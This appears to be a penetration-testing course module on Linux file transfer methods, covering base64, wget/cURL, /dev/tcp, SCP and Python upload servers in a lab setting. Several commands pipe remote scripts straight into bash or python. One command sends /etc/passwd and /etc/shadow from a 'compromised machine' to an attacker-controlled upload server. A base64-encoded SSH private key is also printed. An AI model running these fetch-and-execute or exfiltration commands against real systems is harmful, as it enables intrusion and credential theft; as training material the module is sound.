
---

Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.

## Base64 Encoding / Decoding

Depending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.

#### Pwnbox - Check File MD5 hash
`tylapcheong@htb[/htb]$ md5sum id_rsa

`4e301756a07ded0a2dd6953abf015278  id_rsa`

We use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.

#### Pwnbox - Encode SSH Key to Base64
`tylapcheong@htb[/htb]$ cat id_rsa |base64 -w 0;echo 
`LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUF`

We copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.
#### Linux - Decode the File
`tylapcheong@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa`

Finally, we can confirm if the file was transferred successfully using the `md5sum` command.

#### Linux - Confirm the MD5 Hashes Match
`tylapcheong@htb[/htb]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278  id_rsa`

## Web Downloads with Wget and cURL

Two of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.

To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.

#### Download a File Using wget
`tylapcheong@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`

`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

#### Download a File Using cURL
`tylapcheong@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

## Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.

#### Fileless Download with cURL
`tylapcheong@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`

Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

#### Fileless Download with wget
`tylapcheong@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3 Hello World!`

## Download with Bash (/dev/tcp)

There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

#### Connect to the Target Webserver
`tylapcheong@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80`

#### HTTP GET Request
`tylapcheong@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`

#### Print the Response
`tylapcheong@htb[/htb]$ cat <&3`

## SSH Downloads

SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.

`tylapcheong@htb[/htb]$ sudo systemctl enable ssh
`Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.`

#### Starting the SSH Server
`tylapcheong@htb[/htb]$ sudo systemctl start ssh`

#### Checking for SSH Listening Port
`tylapcheong@htb[/htb]$ netstat -lnpt`

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

#### Linux - Downloading Files Using SCP
`tylapcheong@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .`

## Upload Operations

There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.

## Web Upload

As mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page.
The first thing we need to do is to install the `uploadserver` module.

#### Pwnbox - Start Web Server
`tylapcheong@htb[/htb]$ sudo python3 -m pip install --user uploadserver`
#### Pwnbox - Create a Self-Signed Certificate
`tylapcheong@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
#### Pwnbox - Start Web Server
`tylapcheong@htb[/htb]$ mkdir https && cd https`

`tylapcheong@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

#### Linux - Upload Multiple Files
`tylapcheong@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

We used the option `--insecure` because we used a self-signed certificate that we trust.

## Alternative Web File Transfer Method

Since Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward.

#### Linux - Creating a Web Server with Python3

`tylapcheong@htb[/htb]$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...`

#### Linux - Creating a Web Server with Python2.7

`tylapcheong@htb[/htb]$ python2.7 -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...`

#### Linux - Creating a Web Server with PHP

`tylapcheong@htb[/htb]$ php -S 0.0.0.0:8000 [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started`

#### Linux - Creating a Web Server with Ruby

`tylapcheong@htb[/htb]$ ruby -run -ehttpd . -p8000 
`[2022-05-23 09:35:46] INFO  WEBrick 1.6.1 
`[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]` 
`[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000```

#### Download the File from the Target Machine onto the Pwnbox
`tylapcheong@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt`

**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

## SCP Upload

We may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.
#### File Upload using SCP
`tylapcheong@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/`